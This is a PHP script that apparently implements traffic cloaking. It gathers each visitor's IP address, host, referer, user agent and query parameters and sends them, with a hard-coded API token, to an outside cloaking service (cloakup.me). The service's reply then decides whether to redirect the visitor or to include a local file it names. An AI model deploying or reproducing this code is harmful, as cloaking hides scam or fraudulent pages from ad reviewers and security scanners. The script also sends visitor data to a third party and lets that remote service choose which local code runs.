<?php
function getUserIP()
{
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    return $ip;
}

$data = [
    'token' => '5764ba888d6a88615382c82e821a0101',
    'slug' => '466064f0ef36579d3d774eef',
    'ip' => getUserIP(),
    'domain' => @$_SERVER['HTTP_HOST'],
    'referer' => @$_SERVER['HTTP_REFERER'],
    'user_agent' => @$_SERVER['HTTP_USER_AGENT'],
    'query' => $_GET,
];

$url = 'https://na-beta.cloakup.me?' . http_build_query($data);

$response = json_decode(@file_get_contents($url), true);

if (!$response) {
    jsonResponse(['message' => 'Bad request'], 400, 'Bad request');
    exit;
}

$nextType = $response['next']['type'];
$nextContent = $response['next']['content'];

if ($nextType == 'redirect') {
    if (strrpos($nextContent, '?') === false) {
        $nextContent .= '?' . http_build_query($_GET);
    } else {
        $nextContent .= '&' . http_build_query($_GET);
    }
}
if ($nextType == 'redirect') {
    header('Location: ' . $nextContent, true, 303);
} elseif ($nextType == 'content') {
    if (file_exists(__DIR__ . '/' . $nextContent)) {
        include __DIR__ . '/' . $nextContent;
    }else{
        jsonResponse(['message' => 'File not found'], 404, 'File not found');
    }
}

function jsonResponse(array $data, $status = 200, $statusMessage = 'OK')
{
    header('Content-Type: application/json');
    header('HTTP/1.1 ' . $status . ' ' . $statusMessage);
    echo json_encode($data);
    exit;
}
exit();